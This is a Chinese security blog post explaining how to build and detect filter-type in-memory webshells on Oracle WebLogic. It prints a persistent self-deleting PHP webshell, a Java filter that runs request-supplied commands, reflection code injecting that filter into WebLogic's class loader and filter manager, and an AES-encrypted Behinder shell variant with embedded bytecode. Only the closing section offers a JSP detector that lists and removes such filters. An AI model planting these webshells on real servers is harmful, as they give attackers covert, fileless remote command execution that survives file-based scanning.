---
layout:     post
title:      "Weblogic 内存马（一）"
subtitle:   ""
date:       2021-04-23 13:14:20
author:     "kuron3k0"
header-img: "img/post-bg-rwd.jpg"
tags:
    - Java
---



## 0x00 内存马简介

自从护网以来，以前常规的有文件落地的webshell很容易就被查杀，于是慢慢的就出现了各大中间件的内存马，因为其驻存在内存中，没有文件落地，因此也会更加隐蔽

其实内存马的概念由来已久，以前打AWD比赛的时候，就用过最简单的php内存马：调用完之后把自己删掉，一直在循环中执行，除了重启之外杀不掉

```php
<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '2.php';
$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .2.php');
    usleep(5000);
} 
?>
```

现在说的内存马大都是指java形式的，印象中火起来大概是先知上一系列tomcat不出网回显、无文件攻击技术出现那个时间。至今为止内存马差不多分为以下几种（其中拦截器和controller是spring特有）：

- servlet型

- filter型

- listener型

- 拦截器型

- controller型

- java agent型

前面五种都是利用动态注册的方式把恶意类注册成java组件，java agent型则是需要上传jar包运行，通过动态修改关键类字节码实现内存马

因为同事周末应急遇上了weblogic的内存马，所以今天主要来看一下weblogic下filter型内存马的实现原理



## 0x01 Weblogic filter机制

首先了解Weblogic中filter是怎么运作的，调试找到filter开始执行的地方，可以看到从`getFilterChain`函数中取得filter链，而后调用`doFilter`

```java
if (!invocationContext.hasFilters() && !invocationContext.hasRequestListeners()) {
	this.stub.execute(this.req, this.rsp);
} else {
	FilterChainImpl fc = invocationContext.getFilterChain(this.stub, this.req, this.rsp);
    if (fc == null) {
    	this.stub.execute(this.req, this.rsp);
    } else {
    	fc.doFilter(this.req, this.rsp);
    }
}
```

追溯到`FilterManager`的`getFilterChain`，遍历所有filter名，从`this.filters`获取对应filter，插入filter链，最后返回

```java
FilterWrapper wrapper = (FilterWrapper)this.filters.get(fltrName);
```

那这个FilterWrapper是怎么插到`this.filters`的？就是通过FilterManager的registerFilter方法，其中调用了loadFilter，像是进行了加载Filter的操作

```java
void registerFilter(String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers) throws DeploymentException {
        FilterWrapper fw = new FilterWrapper(filterName, filterClassName, initParams, this.context);
        if (this.loadFilter(fw)) {
            EnumSet<DispatcherType> types = FilterManager.FilterInfo.translateDispatcherType(dispatchers, this.context, filterName);
            if (urlPatterns != null) {
                this.addMappingForUrlPatterns(filterName, types, true, urlPatterns);
            }

            if (servletNames != null) {
                this.addMappingForServletNames(filterName, types, true, servletNames);
            }

            this.filters.put(filterName, fw);
        }
}
```

跟进后发现从filterWrapper取得filter的类名，然后调用`this.context.createInstance(filterClassName)`

```java
boolean loadFilter(FilterWrapper filterWrapper) throws DeploymentException {
        Filter filter = filterWrapper.getFilter();
        if (filter == null) {
            String filterClassName = filterWrapper.getFilterClassName();

            try {
                filter = (Filter)this.context.createInstance(filterClassName);
                filterWrapper.setFilter((String)null, (Class)null, filter, false);
            } catch (Exception var5) {
                HTTPLogger.logCouldNotLoadFilter(this.context.getLogContext() + " " + filterClassName, var5);
                throw new DeploymentException(var5);
            }
        }

        Throwable e = this.initFilter(filterWrapper.getFilterName(), filterWrapper.getFilter(), filterWrapper.getInitParameters());
        return e == null;
}
```

createInstance是`WebAppServletContext`的方法

```java
Object createInstance(String className) throws ClassNotFoundException, InstantiationException, IllegalAccessException {
        Class<?> clazz = this.classLoader.loadClass(className);
        return this.createInstance(clazz);
}
```

这个classLoader是什么？接着跟，找到初始化的地方

```java
this.classLoader = module.getClassLoader();
```

module是`WebAppModule`

```java
public GenericClassLoader getClassLoader() {
        return this.webClassLoader;
}
```

webClassLoader有由`WarUtils.createChangeAwareClassLoader`生成，是`ChangeAwareClassLoader`的实例

```java
private void initLoader(GenericClassLoader parent, boolean createSubLoader) throws ModuleException {
        this.parentClassLoader = parent;
        this.createdClassLoader = createSubLoader;
        if (createSubLoader) {
            weblogic.utils.classloaders.Annotation annotation = new weblogic.utils.classloaders.Annotation(this.appCtx.getAppDeploymentMBean().getApplicationIdentifier(), this.normalizeId(this.getId(), this.moduleURI));
            this.webClassLoader = WarUtils.createChangeAwareClassLoader(this.finder, false, this.parentClassLoader, this.appCtx.isEar(), annotation);
        } else {
            this.webClassLoader = parent;
            this.webClassLoader.addClassFinder(this.finder);
        }

}
```

```java
public static ChangeAwareClassLoader createChangeAwareClassLoader(ClassFinder finder, boolean childFirst, ClassLoader parent, boolean isEar, Annotation annotation) {
        ChangeAwareClassLoader gc = new ChangeAwareClassLoader(finder, childFirst, parent);
        gc.setAnnotation(annotation);
        return gc;
}
```

跟进ChangeAwareClassLoader的loadClass

```java
public Class<?> loadClass(String name) throws ClassNotFoundException {
        boolean doTrace = ctDebugLogger.isDebugEnabled();
        if (doTrace) {
            ClassLoaderDebugger.debug(this, SupportedClassLoader.CACL, "loadClass", name);
        }

        try {
            return this.loadClass(name, false);
......
```

可以看到ChangeAwareClassLoader会从`cachedClasses`取类名为name的类，所以最简单的方法，我们可以把恶意类插入到这里，然后调用`registerFilter`即可生成内存马

```java
protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
        synchronized(this.getClassLoadingLock(name)) {
            Class res = (Class)this.cachedClasses.get(name);
            if (res != null) {
                return res;
            } else 
......
```



## 0x02 生成filter内存马

根据上面的分析，内存马的生成有如下步骤：

1. 加载恶意类

   先写个恶意filter，简单的实现命令执行的功能，更多的像web代理之类的功能完全看filter的实现。这里要注意要重载`init`函数，因为weblogic的servlet库版本比较低，高版本库编译的filter是加载不了的

   ```java
   import javax.servlet.*;
   import java.io.*;
   
   public class EvilFilter implements Filter{
   
       @Override
       public void init(FilterConfig filterConfig) throws ServletException {};
   
       public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
   
           System.out.println("============== in evilfilter ==============");
           String pwd = request.getParameter("pwd");
           String cmd = request.getParameter("cmd");
   
           if(!cmd.isEmpty() && !pwd.isEmpty() && pwd.equals("kuron3k0")) {
               System.out.println("==============  running cmd ==============");
               String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
               response.getOutputStream().println(result);
               response.getOutputStream().flush();
   
           }else{
               chain.doFilter(request, response);
           }
       }
   }
   
   ```

   然后要找到类加载器，也就是那个`ChangeAwareClassLoader`。我们可以看看weblogic的线程类，简要的属性结构如下，可以直接取`contextClassLoader`，或者取request上下文中的`classLoader`，都是可以的

   ```shell
   ExecuteThread
   |__ contextClassLoader
   |__	workEntry
   	|__	connectionHandler
   		|__	request
   			|__	context
   				|__ filterManager
   				|__ classLoader
   ```

   取`contextClassLoader`，调用defineClass，生成class对象

   ```java
   byte[] codeClass = java.util.Base64.getDecoder().decode("yv66vgAAADQAfQoAG......[evil class bytecode]");
   ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
   Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
   define.setAccessible(true);
   Class evilFilterClass  = (Class)define.invoke(cl,codeClass,0,codeClass.length);
   ```

   

2. 动态注册filter

   把恶意类对象写到`cachedClasses`

   ```java
   String filterName = "weblogic.work.SystemFilter";
   
   java.lang.reflect.Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
   cachedClassesF.setAccessible(true);
   Object cachedClass = cachedClassesF.get(cl);
   java.lang.reflect.Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
   putM.invoke(cachedClass, filterName, evilFilterClass);
   ```

   调用`registerFilter`进行注册

   ```java
   //获取context
   Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
   java.lang.reflect.Method m = executeThread.getDeclaredMethod("getCurrentWork");
   Object currentWork = m.invoke(Thread.currentThread());
   
   java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
   connectionHandlerF.setAccessible(true);
   Object obj = connectionHandlerF.get(currentWork);
   
   java.lang.reflect.Field requestF = obj.getClass().getDeclaredField("request");
   requestF.setAccessible(true);
   obj = requestF.get(obj);
   
   java.lang.reflect.Field contextF = obj.getClass().getDeclaredField("context");
   contextF.setAccessible(true);
   Object context = contextF.get(obj);
   
   //调用registerFilter注册
   String evilName = "weblogic.system.method";
   
   java.lang.reflect.Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
   Object filterManager = getFilterManagerM.invoke(context);
   
   java.lang.reflect.Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, java.util.Map.class, String[].class);
   registerFilterM.setAccessible(true);
   registerFilterM.invoke(filterManager, evilName, filterName, url, null, null, null);
   ```
   最后内存马效果
   ![](/img/in-post/weblogic-memshell-1/1.png)
   
   尝试把内存马改成冰蝎马，这里有两个点要注意一下：
   
   - 因为是在filter里，没有`pageContext`，所以需要把`request`、`response`和`session`对象插入map中传给equals函数；
   - 然后就是冰蝎马的自定义ClassLoader，刚开始我是把它写成EvilFilter的内部类，但是实际上编译出来会变成两个class文件：`EvilFilter.class`和`EvilFilter$U.class`，为了方便，这里就直接把类加载器的类字节码硬编码到EvilFilter中，用Weblogic的类加载器加载这个类，然后为了不会重定义类，先用loadClass加载一下，如果没找到的话才调用defineClass
   
   ```java
   public class EvilFilter implements Filter{
   
   
       @Override
       public void init(FilterConfig filterConfig) throws ServletException {};
   
       public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
   
           try {
               if(((HttpServletRequest)request).getMethod().equals("POST")){
   
                   HttpSession session = ((HttpServletRequest)request).getSession();
                   String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                   session.putValue("u", k);
                   Cipher c = Cipher.getInstance("AES");
                   c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
   
                   HashMap map = new HashMap();
                   map.put("request", request);
                   map.put("response", ((weblogic.servlet.internal.ServletRequestImpl)request).getResponse());
                   map.put("session", session);
   
                   //取classloader
                   byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
                   ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
                   java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                   define.setAccessible(true);
                   Class uclass = null;
                   try{
                       uclass = cl.loadClass("U");
                   }catch(ClassNotFoundException e){
                       uclass  = (Class)define.invoke(cl,bytecode,0,bytecode.length);
                   }
   
                   Constructor constructor =  uclass.getDeclaredConstructor(ClassLoader.class);
                   constructor.setAccessible(true);
                   Object u = constructor.newInstance(this.getClass().getClassLoader());
                   Method Um = uclass.getDeclaredMethod("g",byte[].class);
                   Um.setAccessible(true);
   
                   //调用冰蝎的payload
                   byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                   Class evilclass = (Class) Um.invoke(u,evilClassBytes);
                   Object a = evilclass.newInstance();
                   Method b = evilclass.getDeclaredMethod("equals",Object.class);
                   b.setAccessible(true);
                   b.invoke(a, map);
                   return;
   
               }
           }catch(Exception ex){
               ex.printStackTrace();
   
           }
           chain.doFilter(request, response);
   
       }
   
   
   }
   
   ```
   
   成功连接（其实之前Beta 9的时候卡了好久，response对象没有返回数据，吃完饭回来永永大神就改好了，感动TAT，这里用的Beta 10）
   ![](/img/in-post/weblogic-memshell-1/5.png)

## 0x03 内存马查杀

要找到是否有filter类型的内存马，只需在`getFilterChain`处下手即可；只要从`FileManager`中的`filters`删掉恶意filter，filter链就不会有恶意filter了

```java
if (this.filters.size() > 0) {
            Iterator var10 = this.filterPatternList.iterator();

            String fltrName;
            while(var10.hasNext()) {
                FilterManager.FilterInfo fi = (FilterManager.FilterInfo)var10.next();
                if (fi.isApplicable(dispatcher)) {
                    URLMapping m = fi.getMap();
                    fltrName = (String)m.get(uri);
                    if (fltrName != null) {
                        FilterWrapper wrapper = (FilterWrapper)this.filters.get(fltrName);
                        if (wrapper != null) {
                            if (fci == null) {
                                fci = new FilterChainImpl();
                            }

                            fci.add(wrapper); //插入filter链中
                        }
```

filter类型的内存马有两个很致命的特点，第一是继承Filter类，第二因为我们使用defineClass加载的类，是不会有class文件落地的，因此查看它的类加载路径会返回null。

根据这两个特点可以简单写一个检测jsp脚本

```java\
<%@page import="java.lang.reflect.Field"%>
<%@page import="java.lang.reflect.Method"%>
<%@page import="java.util.Map"%>
<%@page import="java.util.Iterator"%>

<title>Weblogic Filter memshell killer</title>
<div>
<label>list filters:	</label><a href='kill.jsp?cmd=&pwd=&type=list&filter='>list</a>
</div>
<hr>
<%

try {
    String type = request.getParameter("type");
    String filtername = request.getParameter("filtername");
    
    //classLoader
    ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
    Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
    cachedClassesF.setAccessible(true);
    Map cachedClass = (Map)cachedClassesF.get(cl);
    
    Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
    java.lang.reflect.Method m = executeThread.getDeclaredMethod("getCurrentWork");
    Object currentWork = m.invoke(Thread.currentThread());

    java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
    connectionHandlerF.setAccessible(true);
    Object obj = connectionHandlerF.get(currentWork);

    java.lang.reflect.Field requestF = obj.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    obj = requestF.get(obj);

    java.lang.reflect.Field contextF = obj.getClass().getDeclaredField("context");
    contextF.setAccessible(true);
    Object context = contextF.get(obj);

    //获取context中的FilterManager
    java.lang.reflect.Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
    Object filterManager = getFilterManagerM.invoke(context);
    
    if(type == null || type.isEmpty()){

        out.println("please input type<br>");

    }else if(type.equals("list")){
    
        Field filters = filterManager.getClass().getDeclaredField("filters");
        filters.setAccessible(true);
        Map filters_map = (Map)filters.get(filterManager);
    
        Iterator it = filters_map.keySet().iterator();

        while(it.hasNext()){
            String key = (String)it.next();
            weblogic.servlet.internal.FilterWrapper fw = (weblogic.servlet.internal.FilterWrapper)filters_map.get(key);
            Field f = fw.getClass().getDeclaredField("filter");
            f.setAccessible(true);
            Object filter = f.get(fw);
            out.println("[classname]: "+filter.getClass().getName()+"<br>");
            out.println("[isFilter]: "+javax.servlet.Filter.class.isAssignableFrom(filter.getClass())+"<br>");
            out.println("[classLoaderName]: "+filter.getClass().getClassLoader().getClass().getName()+"<br>");
            out.println("[classFilePath]: "+filter.getClass().getProtectionDomain().getCodeSource().getLocation()+"<br>");
            out.println("<button><a href='kill.jsp?cmd=&pwd=&type=kill&filtername="+key+"'>delete filter</a></button><br>");
            out.println("=======================================<br>");
        
        } 
    }else if(type.equals("kill") && filtername!= null){
        
        Field filters = filterManager.getClass().getDeclaredField("filters");
        filters.setAccessible(true);
        Map filters_map = (Map)filters.get(filterManager);
        filters_map.remove(filtername);
   
    }
} catch (Exception e) {
    e.printStackTrace();
}
%>
```

可以很明显找到恶意的Filter，类路径为空
![](/img/in-post/weblogic-memshell-1/2.png)

点击删除
![](/img/in-post/weblogic-memshell-1/3.png)

内存马已失效
![](/img/in-post/weblogic-memshell-1/4.png)



网上似乎找不到servlet和listener类型的weblogic内存马，有时间再看看能不能实现



未完待续



## 0x04 参考

[https://paper.seebug.org/1249/](https://paper.seebug.org/1249/)

[https://github.com/Y4er/WebLogic-Shiro-shell/blob/master/src/main/java/org/chabug/memshell/InjectFilterShell.java](https://github.com/Y4er/WebLogic-Shiro-shell/blob/master/src/main/java/org/chabug/memshell/InjectFilterShell.java)

[https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/weblogic/FilterBasedBasic.java](https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/weblogic/FilterBasedBasic.java)

[https://cloud.tencent.com/developer/news/648073](https://cloud.tencent.com/developer/news/648073)

[https://xz.aliyun.com/t/7388#toc-2](https://xz.aliyun.com/t/7388#toc-2)

[https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/](https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/)